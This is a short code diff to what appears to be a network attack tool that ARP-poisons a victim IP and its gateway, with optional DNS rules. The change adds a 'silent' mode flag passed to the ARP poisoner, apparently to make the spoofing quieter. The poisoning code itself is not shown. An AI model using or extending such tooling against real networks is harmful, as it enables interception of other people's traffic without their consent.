@@ -41,6 +41,7 @@ class AttackConfig:
     gateway_ip: str
     dns_rules: dict[str, str] | None = None
     arp_interval: float = 2.0
+    silent: bool = False
 
 
 class AttackManager:
@@ -103,11 +104,14 @@ class AttackManager:
 
             if needs_arp:
                 click.echo("[*] Initializing ARP poisoner...")
+                arp_mode = "silent" if self.config.silent else "all-out"
+                click.echo(f"[*] ARP mode: {arp_mode}")
                 self._arp_poisoner = ARPPoisoner(
                     iface=self.config.iface,
                     victim_ip=self.config.victim_ip,
                     target_ip=self.config.gateway_ip,
                     interval=self.config.arp_interval,
+                    silent=self.config.silent,
                 )
                 self._arp_poisoner.start()
 
